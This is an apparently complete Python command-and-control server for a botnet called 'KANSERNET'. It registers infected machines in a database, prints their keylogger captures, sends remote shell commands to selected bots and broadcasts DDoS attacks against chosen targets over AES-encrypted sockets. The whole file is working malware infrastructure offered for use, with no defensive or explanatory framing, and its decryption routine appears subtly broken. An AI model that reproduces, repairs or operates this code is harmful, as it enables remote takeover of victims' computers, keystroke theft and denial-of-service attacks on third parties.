#!/usr/bin/env python3
import socket, threading, json, time, os, sys, base64, hashlib, sqlite3
from datetime import datetime
R, G, Y, B, W = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
def clear(): os.system("cls")
def ts(): return datetime.now().strftime("%H:%M:%S")
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as pad
    from cryptography.hazmat.backends import default_backend as db
except:
    print(f"{R}[!] pip install cryptography{W}"); sys.exit(1)

CFG = {"host":"0.0.0.0","port":6666,"password":"kansernet2026"}
AES_KEY = hashlib.sha256(CFG["password"].encode()).digest()

def aes_enc(data):
    iv = os.urandom(16); c = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=db()).encryptor()
    p = pad.PKCS7(128).padder(); pt = p.update(data.encode())+p.finalize()
    return base64.b64encode(iv + c.update(pt) + c.finalize()).decode()

def aes_dec(enc):
    raw = base64.b64decode(enc); iv, ct = raw[:16], raw[16:]
    c = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=db()).decryptor()
    pt = c.update(ct)+c.finalize(); return pad.PKCS7(128).unpadder().update(pt)+pad.PKCS7(128).unpadder().finalize()

class C2Cli:
    def __init__(self):
        self.bots, self.selected, self.running = {}, None, True
        self.db = sqlite3.connect("kansernet.db", check_same_thread=False)
        self.db.execute("CREATE TABLE IF NOT EXISTS bots (id TEXT, ip TEXT, os TEXT, hostname TEXT, user TEXT, cpu INTEGER, ram REAL, first TEXT, last TEXT, status TEXT)")
        self.db.commit()
    def _srv(self):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((CFG["host"], CFG["port"])); s.listen(5000)
        print(f"{G}[{ts()}] C2 listening on {CFG['host']}:{CFG['port']} [AES]{W}")
        while self.running:
            try:
                s.settimeout(1); c, a = s.accept()
                threading.Thread(target=self._h, args=(c, a), daemon=True).start()
            except socket.timeout: continue
            except: break
        s.close()
    def _h(self, c, a):
        try:
            d = c.recv(4096).decode(errors="ignore")
            msg = json.loads(aes_dec(d).decode())
        except: c.close(); return
        bid = msg.get("id", hashlib.md5(f"{a[0]}{time.time()}".encode()).hexdigest()[:8])
        info = msg.get("info", {})
        self.bots[bid] = {"conn": c, "addr": a[0], "last_seen": time.time(), **info}
        self.db.execute("INSERT OR REPLACE INTO bots VALUES (?,?,?,?,?,?,?,datetime('now'),datetime('now'),'online')", (bid, a[0], info.get("os",""), info.get("hostname",""), info.get("user",""), info.get("cpu",0), info.get("ram",0)))
        self.db.commit()
        print(f"{G}[{ts()}] [+] Bot: {bid} ({a[0]}) {info.get('os','?')}{W}")
        while self.running:
            try:
                c.settimeout(1); d = c.recv(4096)
                if not d: break
                resp = json.loads(aes_dec(d.decode(errors="ignore")).decode())
                tp = resp.get("type","")
                if tp == "heartbeat": self.bots[bid]["last_seen"] = time.time()
                elif tp == "shell": print(f"{B}[{bid}] {resp.get('data','')}{W}")
                elif tp == "ddos_done": print(f"{Y}[{bid}] DDoS done: {resp.get('data','')}{W}")
                elif tp == "keylog": print(f"{Y}[KEYLOG:{bid}] {resp.get('data','')}{W}")
            except socket.timeout: continue
            except: break
        c.close()
        if bid in self.bots: del self.bots[bid]
        print(f"{R}[{ts()}] [-] Bot: {bid}{W}")
    def _send(self, bid, cmd, data=""):
        if bid in self.bots:
            try:
                msg = aes_enc(json.dumps({"cmd": cmd, "data": data}))
                self.bots[bid]["conn"].send(msg.encode()); return True
            except: pass
        return False
    def _broadcast(self, cmd, data=""):
        cnt = sum(1 for b in self.bots if self._send(b, cmd, data))
        print(f"{Y}[{ts()}] Broadcast {cmd} -> {cnt}/{len(self.bots)}{W}")
    def _cmd_loop(self):
        clear()
        print(f"{R}=== KANSERNET C2 CLI v1.0 ==={W}")
        print("list | count | select <id> | shell <cmd> | ddos <t> <m> <s> | broadcast <cmd> | exit\n")
        while self.running:
            try:
                raw = input(f"{G}C2>{W} ").strip()
                if not raw: continue
                p = raw.split()
                if p[0] == "help": print("list | count | select <id> | shell <cmd> | ddos <t> <m> <s> | broadcast <cmd> | exit")
                elif p[0] == "exit": self.running = False; break
                elif p[0] == "count": print(f"{B}Bots online: {len(self.bots)}{W}")
                elif p[0] == "list":
                    if not self.bots: print(f"{Y}No bots{W}")
                    else:
                        for bid, info in sorted(self.bots.items(), key=lambda x: x[1].get("last_seen",0), reverse=True):
                            mk = f"{R}*{W}" if bid == self.selected else " "
                            print(f"  {mk} {bid} | {info.get('addr','?')} | {info.get('os','?')} | {info.get('hostname','?')}")
                elif p[0] == "select" and len(p) > 1:
                    if p[1] in self.bots: self.selected = p[1]; print(f"{G}Selected: {p[1]}{W}")
                    else: print(f"{R}Bot not found: {p[1]}{W}")
                elif p[0] == "shell":
                    if not self.selected: print(f"{Y}Select a bot first{W}"); continue
                    self._send(self.selected, "shell", raw[6:])
                elif p[0] == "broadcast" and len(p) > 1: self._broadcast(raw.split(" ", 1)[1])
                elif p[0] == "ddos" and len(p) >= 4:
                    t, m, s = p[1], p[2], p[3]
                    self._broadcast("ddos", json.dumps({"target":t,"method":m,"duration":int(s)}))
                    print(f"{R}[{ts()}] DDoS: {m} -> {t} ({s}s){W}")
                else: print(f"{R}Unknown: {p[0]}{W}")
            except KeyboardInterrupt: self.running = False; break
            except: print(f"{R}Error{W}")
    def run(self):
        threading.Thread(target=self._srv, daemon=True).start()
        self._cmd_loop(); print(f"{Y}[{ts()}] C2 stopped{W}")

if __name__ == "__main__":
    try: C2Cli().run()
    except KeyboardInterrupt: pass
